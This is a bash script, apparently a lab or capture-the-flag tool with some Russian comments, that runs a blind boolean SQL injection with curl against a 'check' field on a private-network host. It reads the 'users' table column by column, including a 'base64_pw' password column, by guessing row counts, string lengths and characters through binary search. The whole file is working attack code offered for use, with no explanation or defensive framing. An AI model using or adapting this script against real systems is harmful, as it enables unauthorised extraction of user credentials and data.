#!/bin/bash

#paramname="users"
tablename="users"
#columnname="USER"
#count_req="SELECT+COUNT(column_name)+FROM+information_schema.columns+WHERE+table_name=\"${paramname}\"+LIMIT+0,1"

echo "**************${tablename}**************"
for columnname in id gid base64_pw
do
    count_req="SELECT+COUNT(${columnname})+FROM+${tablename}+LIMIT+0,1"
    for ((v=0; v<100; v++))
    do
        if curl -X POST http://172.23.148.75/ -H "${header}" -d "check=1'!=((${count_req})=${v})--+" -s | grep -q "under"; then
          break
        fi
    done

    echo "====${columnname}===="
    if ((v==100)); then
         echo "NO VALUE"
         break
    fi

    for ((l=0; l<v; l++))
    do
      header="Content-Type: application/x-www-form-urlencoded"
      request="SELECT+${columnname}+FROM+${tablename}+LIMIT+${l},1"
      #определяем длину строки, которую ищем
      for ((c=0; c<250; c++))
      do
        if curl -X POST http://172.23.148.75/ -H "${header}" -d "check=1'!=(length((${request}))=${c})--+" -s | grep -q "under"; then
          break
        fi
      done

      if ((c==250)); then
         echo "NO STRING"
         break
      fi
      #echo "---string length = ${c}---"

      for ((j=1; j<(c+1); j++))
      do

        #сужаем диапозон поиска
        start=0
        end=150
        for ((k=1;k<6;k++))
        do
          point=$((start+(end-start)/2))
          if curl -X POST http://172.23.148.75/ -H "${header}" -d "check=1'!=(ASCII(substring((${request}),${j},1))>${point})--+" -s | grep -q "under"; then
            start=$((start-1+(end-start)/2))
          else
            end=$((end+1-(end-start)/2))
          fi
              #echo "${start}-${end}"
        done


        for  ((i=start; i<(end+1); i++))
        do
          if curl -X POST http://172.23.148.75/ -H "${header}" -d "check=1'!=(ASCII(substring((${request}),${j},1))=${i})--+" -s | grep -q "under"; then
            printf "%b" $(printf '\%o' ${i})
            break
          fi
        done
      done
      printf "\n"
    done
done
